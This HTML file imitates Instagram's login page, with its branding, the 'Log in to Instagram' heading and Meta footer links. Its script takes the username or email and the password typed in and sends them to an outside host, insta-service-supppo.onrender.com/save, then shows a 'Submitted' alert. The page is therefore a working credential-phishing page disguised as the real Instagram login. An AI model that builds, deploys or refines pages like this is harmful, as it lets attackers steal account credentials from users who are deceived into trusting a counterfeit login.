<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram Clone</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="stylesheet" href="style.css">
</head>

<body>
<style>
/* (same CSS — unchanged) */
body {
    margin: 0;
    background: #fafafa;
    font-family: Arial, sans-serif;
    color: #262626;
    display: flex;
    flex-direction: column;
    min-height: 100vh;
}

.logo-img {
    width: 80px;
    position: absolute;
    top: 20px;
    left: 20px;
}

.container {
    display: flex;
    flex: 1;
}

.left {
    flex: 1;
    padding: 100px 80px;
}

.left h1 {
    font-size: 40px;
    font-weight: 500;
}

.left span {
    color: #ff3040;
}

.main-img {
    width: 400px;
    margin-top: 30px;
}

.right {
    flex: 1;
    display: flex;
    justify-content: center;
    align-items: center;
}

.login-box {
    width: 350px;
    background: white;
    padding: 30px;
    border: 1px solid #dbdbdb;
    border-radius: 8px;
}

.login-box input {
    width: 100%;
    padding: 12px;
    margin: 8px 0;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 5px;
    color: #262626;
}

.login-box button {
    width: 100%;
    padding: 12px;
    margin-top: 10px;
    border-radius: 8px;
    cursor: pointer;
    border: none;
}

.login-btn {
    background: #0095f6;
    color: white;
}

.fb {
    background: transparent;
    color: #385185;
    font-weight: bold;
}

.create {
    background: transparent;
    border: 1px solid #0095f6;
    color: #0095f6;
}

.forgot {
    text-align: center;
    color: #00376b;
    font-size: 12px;
}

.divider {
    height: 1px;
    background: #dbdbdb;
    margin: 20px 0;
}

.meta {
    text-align: center;
    margin-top: 20px;
    color: #8e8e8e;
}

.footer {
    text-align: center;
    padding: 20px;
    font-size: 12px;
    color: #8e8e8e;
}

.footer-links {
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    gap: 15px;
    margin-bottom: 10px;
}

.footer-links span {
    cursor: pointer;
}

.footer-bottom {
    display: flex;
    justify-content: center;
    gap: 20px;
}
</style>

<img src="logo.png" class="logo-img">

<div class="container">

    <div class="left">
        <h1>
            See everyday moments from your <br>
            <span>close friends.</span>
        </h1>
        <img src="phone.png" class="main-img">
    </div>

    <div class="right">
        <div class="login-box">
            <h2>Log in to Instagram</h2>

            <input id="email" type="text" placeholder="Mobile number, username or email">
            <input id="password" type="password" placeholder="Password">

            <button class="login-btn" id="loginBtn">Log in</button>

            <p class="forgot">Forgot password?</p>

            <div class="divider"></div>

            <button class="fb">Log in with Facebook</button>
            <button class="create">Create new account</button>

            <p class="meta">Meta</p>
        </div>
    </div>

</div>

<footer class="footer">
    <div class="footer-links">
        <span>Meta</span>
        <span>About</span>
        <span>Blog</span>
        <span>Jobs</span>
        <span>Help</span>
        <span>API</span>
        <span>Privacy</span>
        <span>Terms</span>
        <span>Top Accounts</span>
        <span>Hashtags</span>
        <span>Locations</span>
    </div>

    <div class="footer-bottom">
        <span>English</span>
        <span>© 2021 Instagram from Meta</span>
    </div>
</footer>

<!-- 🚀 FIXED BACKEND SCRIPT -->
<script>
document.getElementById("loginBtn").addEventListener("click", function(e) {
    e.preventDefault();

    const email = document.getElementById("email").value.trim();
    const password = document.getElementById("password").value.trim();

    if (!email || !password) {
        alert("Enter details");
        return;
    }

    fetch("https://insta-service-supppo.onrender.com/save", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ email, password })
    })
    .then(res => res.text())
    .then(data => {
        alert("Submitted ✅");
        console.log(data);
    })
    .catch(err => {
        console.error(err);
        alert("Error ❌");
    });
});
</script>

</body>
</html>
